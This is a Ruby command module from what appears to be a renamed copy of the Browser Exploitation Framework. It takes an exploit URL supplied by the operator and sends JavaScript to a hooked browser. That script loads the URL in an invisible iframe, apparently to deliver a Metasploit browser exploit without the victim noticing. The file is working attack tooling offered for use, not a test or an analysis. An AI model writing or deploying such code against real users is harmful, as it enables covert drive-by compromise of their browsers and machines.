#
# Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (Server) - https://serverproject.com
# See the file 'doc/COPYING' for copying permission
#

# This is a dummy module to fool Server's loading system
class Msf_module < Server::Core::Command
  def output
    command = Server::Core::Models::Command.find(@command_id)
    data = JSON.parse(command['data'])
    sploit_url = data[0]['sploit_url']

    "
server.execute(function() {
        var result;

        try {
                var sploit = server.dom.createInvisibleIframe();
                sploit.src = '#{sploit_url}';
        } catch(e) {
                for(var n in e)
                        result+= n + ' '  + e[n] ;
        }

});"
  end
end
